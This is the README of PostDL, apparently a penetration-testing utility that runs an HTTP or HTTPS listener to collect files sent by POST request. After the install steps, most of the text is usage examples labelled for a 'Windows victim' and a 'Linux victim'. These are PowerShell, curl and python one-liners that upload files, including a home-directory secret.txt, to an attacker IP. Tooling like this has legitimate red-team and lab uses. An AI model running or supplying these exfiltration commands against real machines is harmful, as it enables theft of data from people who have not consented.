######
PostDL
######

| Retrieving files using post requests.

*******
Install
*******

.. code-block:: bash

    pipx install git+https://gitlab.com/charles.gargasson/PostDL.git@main
    # pipx uninstall postdl
    # pipx upgrade postdl

|

*****
Usage
*****

| Starting server using http or https

.. code-block:: bash

    postdl --ip 0.0.0.0 --port 8080
    ==> Listening 0.0.0.0:8080 

    postdl --ip 0.0.0.0 --port 8443 --tls
    ==> Listening 0.0.0.0:8443

|

| Windows victim

.. code-block:: powershell

    powershell -c "(New-Object System.Net.WebClient).UploadFile('http://4.3.2.1:8080/','C:\Users\BOB\Pictures\xyz.jpg')"

|

| Linux victim

.. code-block:: bash

    curl -F "file=@/etc/blabla/xyz.jpg" "http://4.3.2.1:80"
    curl -kF file=@/home/user/secret.txt https://4.3.2.1:8443
    python3 -c 'import requests;f = {"file": open("/tmp/HACKER.tar.gz", "rb")};r = requests.post("https://4.3.2.1:443", files=f, verify=False)'

|